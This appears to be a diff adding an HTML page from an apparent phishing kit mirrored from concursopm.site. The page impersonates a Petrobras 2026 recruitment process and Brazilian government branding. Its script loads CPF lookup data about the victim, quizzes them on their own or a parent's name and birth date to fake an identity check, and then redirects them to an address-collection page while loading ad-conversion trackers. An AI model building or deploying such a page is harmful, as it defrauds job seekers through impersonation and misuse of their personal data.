@@ -1,0 +1,526 @@
+<!doctype html>
+<html lang="pt-br">
+    
+<!-- Validação de Dados - Processo Seletivo Petrobrás 2026 -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <head>
+        <meta charset="UTF-8" />
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <title>Processo Seletivo Petrobrás 2026 - Validação de Dados</title>
+        <!-- Microsoft Clarity Analytics -->
+        <script type="text/javascript">
+            (function (c, l, a, r, i, t, y) {
+                c[a] =
+                    c[a] ||
+                    function () {
+                        (c[a].q = c[a].q || []).push(arguments);
+                    };
+                t = l.createElement(r);
+                t.async = 1;
+                t.src = "https://www.clarity.ms/tag/" + i;
+                y = l.getElementsByTagName(r)[0];
+                y.parentNode.insertBefore(t, y);
+            })(window, document, "clarity", "script", "t84urj3twx");
+        </script>
+
+        <script src="../../3.4.16.js"></script>
+        <link href="../css/all.min.css" rel="stylesheet" />
+        <link href="../css/home.css" rel="stylesheet" />
+        <script src="../js/utm-preservation.js"></script>
+        <!-- Sistema de parâmetros cross-domain removido -->
+        <!-- Umitfy UTM Tracking - Comentado para uso futuro -->
+        <!-- <script src="../../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script> -->
+        <script>
+          window.googlePixelId = "68f51a0112dd960e96bee945";
+          var a = document.createElement("script");
+          a.setAttribute("async", "");
+          a.setAttribute("defer", "");
+          a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+          document.head.appendChild(a);
+        </script>
+        <script
+          src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+          data-utmify-prevent-xcod-sck
+          data-utmify-prevent-subids
+          async
+          defer
+        ></script>
+        <script>
+            // Replace with your actual counter name
+            fetch("https://counterapi.com/api/hit/cnu")
+                .then((res) => res.json())
+                .then((data) => {
+                    console.log("Total visits:", data.count);
+                    // You can remove the console.log if you want no output at all
+                })
+                .catch((err) => console.error("Visit counter error:", err));
+        </script>
+
+        <style>.gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #044785;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+                font-weight: 600;
+            }
+            button#submit-button {
+                transition: all 0.2s ease;
+                background-color: #003f6b;
+                color: rgba(255, 255, 255, 0.6);
+            }
+            button#submit-button:not([disabled]) {
+                color: white;
+                cursor: pointer;
+            }
+            button#submit-button:not([disabled]):hover {
+                background-color: #4d7396;
+            }
+            .required-star {
+                color: #ff0000;
+            }
+            .footer-bg {
+                background-color: #1c2b39;
+            }
+            .option-container {
+                border: 2px solid #d1d5db;
+                transition: all 0.2s ease;
+            }
+            .option-container:hover {
+                border-color: #93c5fd;
+            }
+            .option-container.selected {
+                border-color: #003f6b;
+                background-color: #f0f9ff;
+            }
+            .option-container.selected .option-selector {
+                background-color: #003f6b;
+                color: white;
+            }
+            .option-selector {
+                background-color: #e5e7eb;
+                color: #4b5563;
+            }
+            #validation-step {
+                transition: opacity 0.5s ease;
+            }
+        </style>
+        <script>
+            const fakeName1 = "MARCELO HENRIQUE SILVA SOUZA";
+            const fakeName2 = "LUCAS PEREIRA MENDES";
+
+            const fakeDate1 = "1998-03-25";
+            const fakeDate2 = "2002-08-17";
+
+            let currentStep = 1;
+            let nomeSelecionado = null;
+            let dataSelecionada = null;
+            let userData = null;
+
+            document.addEventListener("DOMContentLoaded", function () {
+                const cpfDataString = localStorage.getItem("cpfData");
+
+                // Dados de teste para desenvolvimento (quando não há dados reais)
+                const testUserData = {
+                    NOME: "IRACEMA DE SOUSA SILVA",
+                    NASC: "1970-10-24 00:00:00",
+                };
+
+                if (!cpfDataString) {
+                    console.log(
+                        "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                    );
+                    userData = testUserData;
+                } else {
+                    const parsedData = JSON.parse(cpfDataString);
+                    console.log("Dados recebidos:", parsedData);
+                    
+                    // Verificar se é o novo formato de dados alternativos
+                    if (parsedData.userCPF && parsedData.userNome) {
+                        // Novo fluxo: dados alternativos
+                        console.log("Fluxo de dados alternativos detectado");
+                        
+                        // Verificar se temos dados do responsável para validação
+                        if (parsedData.dadosResponsavel) {
+                            // Usar dados do responsável para validação
+                            userData = {
+                                NOME: parsedData.dadosResponsavel.NOME,
+                                NASC: parsedData.dadosResponsavel.NASC
+                            };
+                            console.log("Usando dados do responsável para validação:", userData);
+                        } else {
+                            // Sem dados do responsável - pular validação
+                            console.log("Sem dados do responsável - pulando validação");
+                            userData = null;
+                            // Redirecionar diretamente para endereço
+                            setTimeout(() => {
+                                redirectWithUtmParams("../endereco/index.html");
+                            }, 1000);
+                            return;
+                        }
+                    } else {
+                        // Fluxo normal: dados da API
+                        let user = null;
+                        
+                        if (parsedData.DADOS) {
+                            // Formato da API antiga (searchapi.dnnl.live)
+                            user = parsedData.DADOS;
+                        } else if (parsedData.dados && parsedData.dados[0]) {
+                            // Formato da API nova (dados é um array)
+                            user = parsedData.dados[0];
+                        } else if (parsedData.nome && parsedData.nascimento) {
+                            // Formato da nova API (proxy-nova-api.php) - dados diretos
+                            user = {
+                                NOME: parsedData.nome,
+                                NASC: parsedData.nascimento
+                            };
+                        } else if (parsedData.NOME && parsedData.NASCIMENTO) {
+                            // Formato da nova API direta
+                            user = {
+                                NOME: parsedData.NOME,
+                                NASC: parsedData.NASCIMENTO
+                            };
+                        }
+
+                        if (!user) {
+                            console.log(
+                                "⚠️ Usando dados de teste - Sistema de segurança desativado",
+                            );
+                            userData = testUserData;
+                        } else {
+                            userData = user;
+                            console.log("Dados processados:", userData);
+                        }
+                    }
+                }
+                
+                // Se não há dados para validação, não mostrar a página
+                if (!userData) {
+                    return;
+                }
+                
+                console.log("Dados carregados:", userData);
+
+                // Verificar se é fluxo alternativo para alterar as perguntas
+                if (cpfDataString) {
+                    const parsedData = JSON.parse(cpfDataString);
+                    console.log("Dados para alteração de perguntas:", parsedData);
+                    if (parsedData.userCPF && parsedData.userNome) {
+                        console.log("Alterando perguntas para fluxo alternativo");
+                        // Personalizar perguntas com nome específico do responsável
+                        if (parsedData.dadosResponsavel && parsedData.dadosResponsavel.NOME) {
+                            const nomeResponsavel = parsedData.dadosResponsavel.NOME;
+                            
+                            // Pergunta de nome genérica (não personalizada)
+                            document.getElementById('name-question').textContent = 
+                                'Para confirmar sua identidade, selecione o nome completo do seu pai ou de sua mãe entre as opções abaixo:';
+                            
+                            // Personalizar apenas a pergunta de data com nome específico
+                            document.getElementById('date-question').textContent = 
+                                `Agora, selecione a data de nascimento de ${nomeResponsavel} entre as opções abaixo:`;
+                            
+                            console.log("Pergunta de data personalizada com nome:", nomeResponsavel);
+                        } else {
+                            // Fallback para perguntas genéricas
+                            document.getElementById('name-question').textContent = 
+                                'Para confirmar sua identidade, selecione o nome completo do seu pai ou de sua mãe entre as opções abaixo:';
+                            document.getElementById('date-question').textContent = 
+                                'Agora, selecione a data de nascimento do seu pai ou de sua mãe entre as opções abaixo:';
+                        }
+                    }
+                }
+
+                showValidationStep(1);
+                fillNameOptions();
+
+                const submitBtn = document.getElementById("submit-button");
+                submitBtn.addEventListener("click", function () {
+                    console.log("Botão clicado - currentStep:", currentStep);
+                    if (currentStep === 1) {
+                        console.log("Step 1 - nomeSelecionado:", nomeSelecionado, "userData.NOME:", userData.NOME);
+                        if (nomeSelecionado) {
+                            console.log("Comparando:", nomeSelecionado, "===", userData.NOME);
+                            console.log("Tipo nomeSelecionado:", typeof nomeSelecionado);
+                            console.log("Tipo userData.NOME:", typeof userData.NOME);
+                            console.log("Length nomeSelecionado:", nomeSelecionado.length);
+                            console.log("Length userData.NOME:", userData.NOME.length);
+                            
+                            if (nomeSelecionado === userData.NOME) {
+                                console.log("Nome correto, indo para step 2");
+                                showValidationStep(2);
+                                fillDateOptions();
+                            } else {
+                                console.log("Nome incorreto");
+                                alert(
+                                    "Nome incorreto! Por favor tente novamente.",
+                                );
+                                resetNameSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    } else if (currentStep === 2) {
+                        console.log("Step 2 - dataSelecionada:", dataSelecionada, "userData.NASC:", userData.NASC);
+                        if (dataSelecionada) {
+                            if (dataSelecionada === userData.NASC) {
+                                console.log("Data correta, redirecionando");
+                                redirectWithUtmParams("../endereco/index.html");
+                            } else {
+                                console.log("Data incorreta");
+                                alert(
+                                    "Data de nascimento incorreta! Por favor tente novamente.",
+                                );
+                                resetDateSelection();
+                            }
+                        } else {
+                            alert("Selecione uma opção para prosseguir.");
+                        }
+                    }
+                });
+            });
+
+            function fillNameOptions() {
+                console.log("Preenchendo opções de nome com userData:", userData);
+                const options = [userData.NOME, fakeName1, fakeName2];
+                console.log("Opções de nome:", options);
+                shuffleArray(options);
+
+                const nameOptions = document.getElementById("name-options");
+                nameOptions.innerHTML = "";
+
+                options.forEach((name, index) => {
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow" style="text-transform:uppercase;">${name}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectNameOption(this, name);
+                    });
+                    nameOptions.appendChild(option);
+                });
+                console.log("Opções de nome preenchidas");
+            }
+
+            function fillDateOptions() {
+                console.log("Preenchendo opções de data com userData:", userData);
+                const options = [userData.NASC, fakeDate1, fakeDate2];
+                console.log("Opções de data:", options);
+                shuffleArray(options);
+
+                const dateOptions = document.getElementById("date-options");
+                dateOptions.innerHTML = "";
+
+                options.forEach((date, index) => {
+                    const formattedDate = formatDate(date);
+                    const option = document.createElement("div");
+                    option.className =
+                        "option-container rounded-md p-4 mb-3 cursor-pointer flex items-center";
+                    option.innerHTML = `
+                <div class="option-selector flex-shrink-0 rounded-full h-6 w-6 mr-3 flex items-center justify-center text-sm font-bold">
+                    ${index + 1}
+                </div>
+                <div class="flex-grow">${formattedDate}</div>
+            `;
+                    option.addEventListener("click", function () {
+                        selectDateOption(this, date);
+                    });
+                    dateOptions.appendChild(option);
+                });
+                console.log("Opções de data preenchidas");
+            }
+
+            function formatDate(dateString) {
+                if (!dateString) return "";
+                // Remove a parte da hora se existir (tanto com 'T' quanto com espaço)
+                if (dateString.includes("T")) {
+                    dateString = dateString.split("T")[0];
+                } else if (dateString.includes(" ")) {
+                    dateString = dateString.split(" ")[0];
+                }
+                const parts = dateString.split("-");
+                if (parts.length === 3) {
+                    return `${parts[2]}/${parts[1]}/${parts[0]}`;
+                }
+                return dateString;
+            }
+
+            function selectNameOption(element, name) {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                nomeSelecionado = name;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function selectDateOption(element, date) {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                element.classList.add("selected");
+                dataSelecionada = date;
+                document.getElementById("submit-button").disabled = false;
+            }
+
+            function resetNameSelection() {
+                const options = document.querySelectorAll(
+                    "#name-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                nomeSelecionado = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function resetDateSelection() {
+                const options = document.querySelectorAll(
+                    "#date-options .option-container",
+                );
+                options.forEach((opt) => opt.classList.remove("selected"));
+                dataSelecionada = null;
+                document.getElementById("submit-button").disabled = true;
+            }
+
+            function showValidationStep(step) {
+                console.log("Mostrando step:", step);
+                const steps = document.querySelectorAll(".validation-step");
+                steps.forEach((s) => s.classList.add("hidden"));
+
+                const targetStep = document.getElementById(`step-${step}`);
+                if (targetStep) {
+                    targetStep.classList.remove("hidden");
+                    console.log("Step", step, "exibido");
+                } else {
+                    console.error("Step", step, "não encontrado!");
+                }
+                currentStep = step;
+                document.getElementById("submit-button").disabled = true;
+                document.getElementById("submit-button-text").textContent =
+                    "Prosseguir";
+            }
+
+            function shuffleArray(array) {
+                for (let i = array.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [array[i], array[j]] = [array[j], array[i]];
+                }
+                return array;
+            }
+        </script>
+    </head>
+    <body class="flex flex-col min-h-screen">
+        <header class="gov-header text-white py-2">
+            <div
+                class="container mx-auto flex justify-between items-center px-4"
+            >
+                <a class="font-bold text-sm" href="#">
+                    <img
+                        src="../images/top_gov-5.jpg"
+                        alt="Logotipo"
+                        class="h-6"
+                    />
+                </a>
+                <nav>
+                    <ul class="flex space-x-4 text-[10px]">
+                        <li>
+                            <a class="hover:underline" href="#"
+                                >ACESSO À INFORMAÇÃO</a
+                            >
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">PARTICIPE</a>
+                        </li>
+                        <li>
+                            <a class="hover:underline" href="#">SERVIÇOS</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+            </div>
+        </div>
+        <div class="container mx-auto px-4" style="background: white; text-align: center; padding-top: 15px; padding-bottom: 0px; margin-bottom: 0px;">
+            <img
+                src="../../images/logopetrobras.png"
+                alt="Processo Seletivo Petrobrás logo"
+                height="60"
+                width="120"
+                style="object-fit: contain; display: block; margin: 0 auto;"
+            />
+        </div>
+        <main class="flex-grow py-8" style="padding-top: 10px !important;">
+            <div class="container mx-auto px-4 max-w-3xl">
+                <div class="border border-gray-300 rounded">
+                    <div class="form-header py-2 px-4 text-center">
+                        <h2 class="text-lg">
+                            Inscrição &gt; Validação de Dados
+                        </h2>
+                    </div>
+                    <div class="p-4">
+                        
+                        <div class="validation-step hidden" id="step-1">
+                            <p class="mb-4" id="name-question">
+                                Para confirmar sua identidade, selecione seu
+                                nome completo entre as opções abaixo:
+                            </p>
+                            <div id="name-options" class="mt-6"></div>
+                        </div>
+                        <div class="validation-step hidden" id="step-2">
+                            <p class="mb-4" id="date-question">
+                                Agora, selecione sua data de nascimento entre as
+                                opções abaixo:
+                            </p>
+                            <div id="date-options" class="mt-6"></div>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-300">
+                        <div class="p-2 bg-gray-100 flex items-center">
+                            <a class="text-gray-700 flex items-center" href="#"
+                                ><i class="fas fa-sign-out-alt mr-1"></i>
+                                Sair</a
+                            >
+                        </div>
+                        <div
+                            class="form-footer p-0 flex justify-center items-center"
+                        >
+                            <button
+                                id="submit-button"
+                                class="flex items-center justify-center w-full h-full py-3"
+                                type="button"
+                                disabled=""
+                            >
+                                <i class="fas fa-arrow-right mr-2"></i>
+                                <span id="submit-button-text">Prosseguir</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+        <footer class="footer-bg text-white py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; Processo Seletivo Petrobrás 2026 - Petrobrás</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-phone-alt mr-1"></i> 0800 616161
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </body>
+
+<!-- Mirrored from concursopm.site/inicio/validar-dados/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Sep 2026 02:22:16 GMT -->
+</html>
